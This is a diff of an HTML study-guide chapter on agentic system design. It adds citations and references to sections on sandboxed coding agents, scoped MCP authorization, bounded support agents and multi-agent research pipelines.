-<td><strong>6.</strong> Tool / MCP contracts, schemas &amp; <code>1:1</code> auth boundaries.&lt;br&gt;<strong>7.</strong> Loop topology (<code>DAG</code>, <code>Evaluator-Optimizer</code>, <code>Handoffs</code>), budgets &amp; HITL.&lt;br&gt;<strong>8.</strong> Durable checkpoints, retries, idempotency &amp; Sagas.</td>
+<td><strong>6.</strong> Tool / MCP contracts, schemas &amp; <code>1:1</code> auth boundaries.<br/><strong>7.</strong> Loop topology (<code>DAG</code>, <code>Evaluator-Optimizer</code>, <code>Handoffs</code>), budgets &amp; HITL.<br/><strong>8.</strong> Durable checkpoints, retries, idempotency &amp; Sagas.</td>
 <td>Model runs as checkpointed state machines; bind identity from caller tokens, never LLM args.</td>
 </tr>
 <tr class="annotatable" data-anchor="ch20-b10">
 <td><strong>D. Safety, Evals &amp; Scale (<code>10 min</code>)</strong></td>
-<td><strong>9.</strong> Threat model (indirect injection, CaMeL, microVM sandbox).&lt;br&gt;<strong>10.</strong> OTel spans, Replay/Golden evals &amp; Canary gates.&lt;br&gt;<strong>11–12.</strong> Queues, TPM budgets, tradeoffs &amp; <strong>simplest V1</strong>.</td>
+<td><strong>9.</strong> Threat model (indirect injection, CaMeL, microVM sandbox).<br/><strong>10.</strong> OTel spans, Replay/Golden evals &amp; Canary gates.<br/><strong>11–12.</strong> Queues, TPM budgets, tradeoffs &amp; <strong>simplest V1</strong>.</td>
 <td>Gate rollouts on <code>cost_per_successful_task</code>, <code>loop_rate</code>, and <code>0%</code> adversarial leak rate.</td>
 </tr>
 </tbody></table></div>
@@ -3546,8 +3531,8 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li value="2" class="annotatable" data-anchor="ch20-b14"><strong>Sandbox &amp; Tool Architecture (Top Half of Diagram):</strong></li>
 </ol>
 <ul>
-<li class="annotatable" data-anchor="ch20-b15">Provision an <strong>ephemeral Firecracker microVM</strong> mounted to a shallow/CoW <strong>Git worktree</strong> at the failing commit SHA—containing <strong>zero production DB credentials</strong> and a default-deny egress firewall (allowing only the internal package mirror).</li>
-<li class="annotatable" data-anchor="ch20-b16">Provide <strong>coarse, token-efficient tools</strong>: <code>symbol_usages(lsp)</code>, <code>ripgrep_search</code>, <code>git_log_range</code>, <code>read_file_lines</code>, <code>apply_unified_diff</code>, and <code>run_targeted_test(selector)</code>. Offload verbose compiler logs (<code>&gt;1,000</code> tokens) to artifacts, feeding only failing assertion diffs into Working Memory.</li>
+<li class="annotatable" data-anchor="ch20-b15">Provision an <strong>ephemeral Firecracker microVM</strong> <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[4]</a> mounted to a shallow/CoW <strong>Git worktree</strong> at the failing commit SHA—containing <strong>zero production DB credentials</strong> and a default-deny egress firewall (allowing only the internal package mirror).</li>
+<li class="annotatable" data-anchor="ch20-b16">Provide <strong>coarse, token-efficient tools</strong> (<em>Agent-Computer Interface</em> <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[5]</a>): <code>symbol_usages(lsp)</code>, <code>ripgrep_search</code>, <code>git_log_range</code>, <code>read_file_lines</code>, <code>apply_unified_diff</code>, and <code>run_targeted_test(selector)</code>. Offload verbose compiler logs (<code>&gt;1,000</code> tokens) to artifacts, feeding only failing assertion diffs into Working Memory.</li>
 </ul>
 <ol>
 <li value="3" class="annotatable" data-anchor="ch20-b17"><strong>Safety &amp; Termination Gates:</strong> Cap the Evaluator-Optimizer repair loop at <code>max_iterations = 4</code> and <code>wall_clock = 8 min</code>. Block edits to CI/security paths (<code>.github/</code>, <code>CODEOWNERS</code>). On green tests, push to <code>bot/fix-&lt;ticket&gt;</code> and open a <strong>Draft PR</strong> attaching the reproduction test and OTel trace—<strong>never auto-merging to <code>main</code></strong>.</li>
@@ -3560,7 +3545,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </ol>
 <ul>
 <li class="annotatable" data-anchor="ch20-b21">The <strong>Enterprise MCP Host</strong> spawns isolated <strong><code>1:1</code> MCP Clients</strong> to the <code>Git</code>, <code>Ticketing</code>, and <code>Analytics</code> MCP Servers over Streamable HTTP <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[3]</a>.</li>
-<li class="annotatable" data-anchor="ch20-b22"><strong>Zero Shared Admin Keys:</strong> For every tool call, the Host exchanges the user&#x27;s SSO JWT via <strong>OAuth 2.0 On-Behalf-Of (<code>OBO</code>)</strong> for a short-lived, audience-scoped token (<code>aud=&quot;mcp://ticketing&quot;</code>). Even under prompt injection, the Ticketing MCP Server physically cannot read tickets outside that user&#x27;s Jira RBAC, and the Analytics MCP Server connects via a read-only database role with <strong>Row-Level Security (<code>RLS</code>)</strong>.</li>
+<li class="annotatable" data-anchor="ch20-b22"><strong>Zero Shared Admin Keys:</strong> For every tool call, the Host exchanges the user&#x27;s SSO JWT via <strong>OAuth 2.0 On-Behalf-Of (<code>OBO</code>, RFC 8693)</strong> <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[6]</a> for a short-lived, audience-scoped token (<code>aud=&quot;mcp://ticketing&quot;</code>). Even under prompt injection, the Ticketing MCP Server physically cannot read tickets outside that user&#x27;s Jira RBAC, and the Analytics MCP Server connects via a read-only database role with <strong>Row-Level Security (<code>RLS</code>)</strong>.</li>
 </ul>
 <ol>
 <li value="2" class="annotatable" data-anchor="ch20-b23"><strong>Orchestration &amp; Consent UX:</strong></li>
@@ -3573,7 +3558,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <p class="annotatable" data-anchor="ch20-d01"><strong>Prompt:</strong> <em>Design a customer-support system handling 500,000 tickets/day across order tracking, cancellations, address changes, and complex damaged-shipment disputes.</em></p>
 <ul>
 <li class="annotatable" data-anchor="ch20-d02"><strong>Step 1 — Don&#x27;t Over-Agentify (<code>80 / 20</code> Split):</strong></li>
-<li class="annotatable" data-anchor="ch20-d03">A fast intent classifier (<code>150 ms</code>) routes <strong><code>~80%</code> of traffic</strong> (order status, standard within-window returns, FAQ) into <strong>Deterministic Workflows</strong>: fixed code fetches <code>get_order(session.user_id)</code>, evaluates exact business rules in Java/Python, and uses a single small-LLM call strictly to phrase a polite response. Cost: <code>&lt;$0.001</code>, hallucinated policy risk: <strong><code>0%</code></strong>.</li>
+<li class="annotatable" data-anchor="ch20-d03">A fast intent classifier (<code>150 ms</code>) routes <strong><code>~80%</code> of traffic</strong> (order status, standard within-window returns, FAQ) into <strong>Deterministic Workflows</strong> <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[1, 2]</a>: fixed code fetches <code>get_order(session.user_id)</code>, evaluates exact business rules in Java/Python, and uses a single small-LLM call strictly to phrase a polite response. Cost: <code>&lt;$0.001</code>, hallucinated policy risk: <strong><code>0%</code></strong>.</li>
 <li class="annotatable" data-anchor="ch20-d04"><strong>Step 2 — Bounded Exception Agent (<code>20%</code> Ambiguous Cases):</strong></li>
 <li class="annotatable" data-anchor="ch20-d05">Multi-item partial damages, carrier delays + loyalty exceptions route to a <strong>Bounded ReAct/Two-Pass Agent</strong> equipped with read tools (<code>get_order</code>, <code>get_carrier_scan</code>, <code>search_return_policy</code>) and policy-gated write tools (<code>issue_credit</code>, <code>reship_item</code>).</li>
 <li class="annotatable" data-anchor="ch20-d06"><strong>Step 3 — Hard Financial Invariants:</strong></li>
@@ -3587,8 +3572,8 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </ol>
 <ul>
 <li class="annotatable" data-anchor="ch20-d10">If one agent runs 15 sequential searches, <code>60,000</code> tokens of noisy snippets flood one context window (&quot;Lost in the Middle&quot;).</li>
-<li class="annotatable" data-anchor="ch20-d11">Instead, a <strong>Lead Planner</strong> decomposes the prompt into <code>3–5</code> orthogonal sub-questions and spawns <strong>parallel Sub-Agents</strong> (<code>Agents-as-Tools</code>), each with its own isolated <code>16K</code> context window, <code>max_searches = 3</code>, and ACL-scoped hybrid retriever.</li>
-<li class="annotatable" data-anchor="ch20-d12">Each worker returns <strong>only compressed, source-tagged evidence cards</strong> (<code>{claim, quote_span, doc_id, published_at, authority_tier}</code>)—discarding <code>90%</code> of raw HTML/chunk noise before reaching the Synthesizer!</li>
+<li class="annotatable" data-anchor="ch20-d11">Instead, a <strong>Lead Planner</strong> decomposes the prompt into <code>3–5</code> orthogonal sub-questions and spawns <strong>parallel Sub-Agents</strong> (<code>Agents-as-Tools</code>), each with its own isolated <code>16K</code> context window, <code>max_searches = 3</code>, and ACL-scoped hybrid retriever <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[1, 2]</a>.</li>
+<li class="annotatable" data-anchor="ch20-d12">Each worker returns <strong>only compressed, source-tagged evidence cards</strong> (<code>{claim, quote_span, doc_id, published_at, authority_tier}</code>)—discarding <code>90%</code> of raw HTML/chunk noise before reaching the Synthesizer <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[1]</a>!</li>
 </ul>
 <ol>
 <li value="2" class="annotatable" data-anchor="ch20-d13"><strong>Conflict Resolution &amp; Citation Verification:</strong></li>
@@ -3626,9 +3611,12 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <hr class="wbw-divider"/>
 <h3 id="ch20-refs" class="annotatable" data-anchor="ch20-b35">Sources &amp; References</h3>
 <ul>
-<li class="annotatable" data-anchor="ch20-b36"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Anthropic Engineering, <em>Building Effective Agents</em> &amp; <em>Multi-Agent Research System Architecture</em> (2024–2025) — <a href="https://www.anthropic.com/research/building-effective-agents" target="_blank" rel="noopener">anthropic.com/research/building-effective-agents</a></li>
-<li class="annotatable" data-anchor="ch20-b37"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> OpenAI, <em>A Practical Guide to Building Agents</em> &amp; <em>Agents SDK Orchestration</em> (2025–2026) — <a href="https://developers.openai.com/api/docs/guides/agents/orchestration" target="_blank" rel="noopener">developers.openai.com/api/docs/guides/agents/orchestration</a></li>
-<li class="annotatable" data-anchor="ch20-b38"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Model Context Protocol (MCP) Specification (<code>2026-07-28</code>), <em>Authorization, Trust Boundaries &amp; Architecture</em> — <a href="https://modelcontextprotocol.io/specification/2026-07-28/architecture" target="_blank" rel="noopener">modelcontextprotocol.io/specification/2026-07-28/architecture</a></li>
+<li class="annotatable" data-anchor="ch20-b36"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Anthropic Engineering, <em>Building Effective Agents</em> &amp; <em>How We Built Our Multi-Agent Research System</em> (2024–2025) — <a href="https://www.anthropic.com/research/multi-agent-research-system" target="_blank" rel="noopener">anthropic.com/research/multi-agent-research-system</a></li>
+<li class="annotatable" data-anchor="ch20-b37"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> OpenAI Developers, <em>Orchestrating Agents: Workflows, Handoffs &amp; Guardrails</em> — <a href="https://developers.openai.com/api/docs/guides/agents/orchestration" target="_blank" rel="noopener">developers.openai.com/api/docs/guides/agents/orchestration</a></li>
+<li class="annotatable" data-anchor="ch20-b38"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Model Context Protocol (MCP) Documentation, <em>Core Architecture, Authorization &amp; Trust Boundaries</em> — <a href="https://modelcontextprotocol.io/docs/learn/architecture" target="_blank" rel="noopener">modelcontextprotocol.io/docs/learn/architecture</a></li>
+<li class="annotatable" data-anchor="ch20-b39"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Alexandru Agache et al. (AWS), <em>Firecracker: Lightweight Virtualization for Serverless Applications</em> (USENIX NSDI 2020) — <a href="https://www.usenix.org/conference/nsdi20/presentation/agache" target="_blank" rel="noopener">usenix.org/conference/nsdi20/presentation/agache</a></li>
+<li class="annotatable" data-anchor="ch20-b40"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[5]</a></strong> John Yang et al., <em>SWE-agent: Agent-Computer Interfaces Enable Automated Software Engineering</em> (NeurIPS 2024) — <a href="https://arxiv.org/abs/2405.15793" target="_blank" rel="noopener">arxiv.org/abs/2405.15793</a></li>
+<li class="annotatable" data-anchor="ch20-b41"><strong><a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[6]</a></strong> IETF RFC 8693, <em>OAuth 2.0 Token Exchange (Delegated On-Behalf-Of Security Tokens)</em> — <a href="https://datatracker.ietf.org/doc/html/rfc8693" target="_blank" rel="noopener">datatracker.ietf.org/doc/html/rfc8693</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch19')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">19. Durable Agent Runtime &amp; 1M/Day</span></button><div class="pager-spacer"></div></nav></article>
   </main>
 </div>
@@ -3785,7 +3773,7 @@ document.addEventListener('mouseup', (e) => {
 });
 
 document.querySelector('.reader-col').addEventListener('click', (e) => {
-  if (e.target.closest('a') || e.target.closest('button') || e.target.closest('.inline-thread-box') || e.target.closest('.thread-pill') || e.target.closest('summary') || e.target.closest('.depth-bar')) {
+  if (e.target.closest('a') || e.target.closest('button') || e.target.closest('.inline-thread-box') || e.target.closest('.thread-pill') || e.target.closest('summary')) {
     return;
   }
   const sel = window.getSelection();
